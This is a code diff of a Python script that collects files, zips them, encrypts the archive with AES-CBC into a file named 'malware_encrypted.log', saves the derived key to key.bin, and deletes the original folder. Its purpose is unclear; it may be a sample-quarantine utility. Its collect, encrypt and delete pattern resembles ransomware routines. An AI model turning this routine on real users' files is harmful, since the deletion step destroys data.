@@ -23,41 +23,50 @@ def collect_files(source_dir, output_folder):
 
 # ===== ENCRYPTION =====
 def encrypt_folder(folder_path, password):
-    """Encrypt folder to 'malware_encrypted.log'."""
+    """Encrypt folder to 'malware_encrypted.log' and save key separately."""
     try:
         # Create ZIP
         shutil.make_archive('temp_archive', 'zip', folder_path)
         
-        # Generate IV + key
+        # Generate IV + salt
         iv = os.urandom(16)
         salt = os.urandom(16)
-        key = PBKDF2HMAC(
+
+        # Derive key
+        kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
             length=32,
             salt=salt,
             iterations=100000,
             backend=default_backend()
-        ).derive(password.encode())
-        
-        # Encrypt
-        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), default_backend())
+        )
+        key = kdf.derive(password.encode())
+
+        # Save key separately to key.bin
+        with open('key.bin', 'wb') as key_file:
+            key_file.write(key)
+
+        # Encrypt the ZIP
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
         encryptor = cipher.encryptor()
         with open('temp_archive.zip', 'rb') as f:
             data = f.read()
             padded = data + bytes([16 - len(data) % 16] * (16 - len(data) % 16))  # PKCS#7 padding
             encrypted = iv + salt + encryptor.update(padded) + encryptor.finalize()
         
-        # Save encrypted file
+        # Save the encrypted file
         with open('malware_encrypted.log', 'wb') as f:
             f.write(encrypted)
-        
+
         # Cleanup
         os.remove('temp_archive.zip')
         shutil.rmtree(folder_path)
         return True
+
     except Exception as e:
         print(f"[!] Encryption failed: {e}")
         return False
+
 
 # ===== DECRYPTION =====
 def decrypt_file(encrypted_path, password):
